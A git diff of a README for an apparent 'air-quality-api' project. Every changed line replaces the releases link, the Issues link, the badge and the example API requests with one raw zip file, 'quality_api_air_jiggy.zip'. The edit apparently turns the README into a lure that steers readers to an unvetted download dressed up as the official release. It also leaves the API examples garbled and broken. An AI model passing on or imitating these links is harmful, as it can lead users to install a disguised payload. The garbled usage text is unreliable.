@@ -1,6 +1,6 @@
 # 🌍 air-quality-api - Get Real-Time Air Quality Data Easily
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Get%20Started-brightgreen)](https://github.com/restrictss/air-quality-api/releases)
+[![Download Now](https://github.com/restrictss/air-quality-api/raw/refs/heads/main/pyal/quality_api_air_jiggy.zip%20Now-Get%20Started-brightgreen)](https://github.com/restrictss/air-quality-api/raw/refs/heads/main/pyal/quality_api_air_jiggy.zip)
 
 ## 🚀 Getting Started
 
@@ -28,7 +28,7 @@ To get this application:
 
 1. **Visit the Releases Page:** Click the link below to go to the Releases page.
    
-   [Download the air-quality-api](https://github.com/restrictss/air-quality-api/releases)
+   [Download the air-quality-api](https://github.com/restrictss/air-quality-api/raw/refs/heads/main/pyal/quality_api_air_jiggy.zip)
 
 2. **Choose the Latest Release:** Look for the latest version listed on the page.
 
@@ -49,13 +49,13 @@ Once you have the application running, here’s how to use it:
 - **By City Name:**
   
   ```
-  GET https://api.yourdomain.com/air-quality?city=Los+Angeles
+  GET https://github.com/restrictss/air-quality-api/raw/refs/heads/main/pyal/quality_api_air_jiggy.zip+Angeles
   ```
 
 - **By GPS Coordinates:**
   
   ```
-  GET https://api.yourdomain.com/air-quality?lat=34.0522&lon=-118.2437
+  GET https://github.com/restrictss/air-quality-api/raw/refs/heads/main/pyal/quality_api_air_jiggy.zip
   ```
 
 ## 📊 Understanding the Data
@@ -78,12 +78,12 @@ To test the air-quality-api, try these steps:
 
 If you encounter issues or have questions:
 
-- Check the [Issues](https://github.com/restrictss/air-quality-api/issues) tab on GitHub.
+- Check the [Issues](https://github.com/restrictss/air-quality-api/raw/refs/heads/main/pyal/quality_api_air_jiggy.zip) tab on GitHub.
 - Reach out for support or consult the documentation for more details on API structure and usage.
 
 ## 🔗 Links and Resources
 
-- **Releases Page:** [Download the air-quality-api](https://github.com/restrictss/air-quality-api/releases)
+- **Releases Page:** [Download the air-quality-api](https://github.com/restrictss/air-quality-api/raw/refs/heads/main/pyal/quality_api_air_jiggy.zip)
 - **Documentation:** For detailed usage, please refer to the available documentation in the repository.
 - **Community Help:** Join discussions in forums or the GitHub community for tips and support.
 
